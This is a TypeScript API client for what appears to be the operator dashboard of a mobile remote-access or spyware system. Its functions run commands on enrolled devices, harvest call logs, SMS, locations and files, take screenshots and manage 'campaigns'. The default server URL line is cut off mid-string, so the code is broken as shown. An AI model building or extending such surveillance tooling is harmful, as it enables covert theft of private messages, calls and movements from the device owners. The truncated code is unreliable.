import axios, { AxiosInstance, AxiosResponse } from 'axios';
import { ApiResponse, Device, Command, Call, Sms, Location, FileSystemItem, Campaign, DeviceStats, TimelineEvent } from './types';
import Cookies from 'js-cookie';

class ApiClient {
  private client: AxiosInstance;
  private baseURL: string;

  constructor() {
    this.baseURL = process.env.NEXT_PUBLIC_API_BASE_URL || 'http:
    this.client = axios.create({
      baseURL: this.baseURL,
      timeout: 30000,
      headers: {
        'Content-Type': 'application/json',
      },
    });

    this.client.interceptors.request.use((config) => {
      const token = Cookies.get('auth_token');
      if (token) {
        config.headers.Authorization = `Bearer ${token}`;
      }
      return config;
    });

    this.client.interceptors.response.use(
      (response) => response,
      (error) => {
        if (error.response?.status === 401) {

          Cookies.remove('auth_token');
          window.location.href = '/login';
        }
        return Promise.reject(error);
      }
    );
  }

  async login(username: string, password: string): Promise<ApiResponse<{ token: string; user: any }>> {
    try {
      const response: AxiosResponse<ApiResponse<{ token: string; user: any }>> = await this.client.post('/auth/login', {
        username,
        password,
      });
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Login failed',
      };
    }
  }

  async logout(): Promise<void> {
    try {
      await this.client.post('/auth/logout');
    } catch (error) {

    } finally {
      Cookies.remove('auth_token');
    }
  }

  async getDevices(): Promise<ApiResponse<Device[]>> {
    try {
      const response: AxiosResponse<ApiResponse<Device[]>> = await this.client.get('/devices');
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to fetch devices',
      };
    }
  }

  async getDevice(guid: string): Promise<ApiResponse<Device>> {
    try {
      const response: AxiosResponse<ApiResponse<Device>> = await this.client.get(`/devices/${guid}`);
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to fetch device',
      };
    }
  }

  async updateDeviceName(guid: string, name: string): Promise<ApiResponse<Device>> {
    try {
      const response: AxiosResponse<ApiResponse<Device>> = await this.client.patch(`/devices/${guid}`, { name });
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to update device name',
      };
    }
  }

  async deleteDevice(guid: string): Promise<ApiResponse<void>> {
    try {
      const response: AxiosResponse<ApiResponse<void>> = await this.client.delete(`/devices/${guid}`);
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to delete device',
      };
    }
  }

  async executeCommand(deviceId: string, command: string): Promise<ApiResponse<Command>> {
    try {
      const response: AxiosResponse<ApiResponse<Command>> = await this.client.post('/commands', {
        deviceId,
        command,
      });
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to execute command',
      };
    }
  }

  async getCommands(deviceId: string, limit = 100): Promise<ApiResponse<Command[]>> {
    try {
      const response: AxiosResponse<ApiResponse<Command[]>> = await this.client.get(
        `/commands?deviceId=${deviceId}&limit=${limit}`
      );
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to fetch commands',
      };
    }
  }

  async getCalls(deviceId: string, limit = 100): Promise<ApiResponse<Call[]>> {
    try {
      const response: AxiosResponse<ApiResponse<Call[]>> = await this.client.get(
        `/data/calls?deviceId=${deviceId}&limit=${limit}`
      );
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to fetch call logs',
      };
    }
  }

  async getSms(deviceId: string, limit = 100): Promise<ApiResponse<Sms[]>> {
    try {
      const response: AxiosResponse<ApiResponse<Sms[]>> = await this.client.get(
        `/data/sms?deviceId=${deviceId}&limit=${limit}`
      );
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to fetch SMS',
      };
    }
  }

  async getLocations(deviceId: string, limit = 100): Promise<ApiResponse<Location[]>> {
    try {
      const response: AxiosResponse<ApiResponse<Location[]>> = await this.client.get(
        `/data/locations?deviceId=${deviceId}&limit=${limit}`
      );
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to fetch locations',
      };
    }
  }

  async getFiles(deviceId: string, path = '/'): Promise<ApiResponse<FileSystemItem[]>> {
    try {
      const response: AxiosResponse<ApiResponse<FileSystemItem[]>> = await this.client.get(
        `/data/files?deviceId=${deviceId}&path=${encodeURIComponent(path)}`
      );
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to fetch files',
      };
    }
  }

  async downloadFile(deviceId: string, filePath: string): Promise<ApiResponse<{ downloadUrl: string }>> {
    try {
      const response: AxiosResponse<ApiResponse<{ downloadUrl: string }>> = await this.client.post('/data/files/download', {
        deviceId,
        filePath,
      });
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to download file',
      };
    }
  }

  async takeScreenshot(deviceId: string): Promise<ApiResponse<{ imageUrl: string }>> {
    try {
      const response: AxiosResponse<ApiResponse<{ imageUrl: string }>> = await this.client.post('/commands/screenshot', {
        deviceId,
      });
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to take screenshot',
      };
    }
  }

  async getCampaigns(): Promise<ApiResponse<Campaign[]>> {
    try {
      const response: AxiosResponse<ApiResponse<Campaign[]>> = await this.client.get('/campaigns');
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to fetch campaigns',
      };
    }
  }

  async createCampaign(campaign: Omit<Campaign, 'id' | 'createdAt'>): Promise<ApiResponse<Campaign>> {
    try {
      const response: AxiosResponse<ApiResponse<Campaign>> = await this.client.post('/campaigns', campaign);
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to create campaign',
      };
    }
  }

  async updateCampaign(id: string, updates: Partial<Campaign>): Promise<ApiResponse<Campaign>> {
    try {
      const response: AxiosResponse<ApiResponse<Campaign>> = await this.client.patch(`/campaigns/${id}`, updates);
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to update campaign',
      };
    }
  }

  async deleteCampaign(id: string): Promise<ApiResponse<void>> {
    try {
      const response: AxiosResponse<ApiResponse<void>> = await this.client.delete(`/campaigns/${id}`);
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to delete campaign',
      };
    }
  }

  async getDeviceStats(): Promise<ApiResponse<DeviceStats>> {
    try {
      const response: AxiosResponse<ApiResponse<DeviceStats>> = await this.client.get('/analytics/stats');
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to fetch stats',
      };
    }
  }

  async getTimeline(deviceId?: string, limit = 100): Promise<ApiResponse<TimelineEvent[]>> {
    try {
      const params = new URLSearchParams({ limit: limit.toString() });
      if (deviceId) params.append('deviceId', deviceId);

      const response: AxiosResponse<ApiResponse<TimelineEvent[]>> = await this.client.get(
        `/analytics/timeline?${params.toString()}`
      );
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Failed to fetch timeline',
      };
    }
  }

  async health(): Promise<ApiResponse<{ status: string; timestamp: number }>> {
    try {
      const response: AxiosResponse<ApiResponse<{ status: string; timestamp: number }>> = await this.client.get('/health');
      return response.data;
    } catch (error: any) {
      return {
        success: false,
        error: error.response?.data?.error || 'Health check failed',
      };
    }
  }
}

export const apiClient = new ApiClient();
export default apiClient;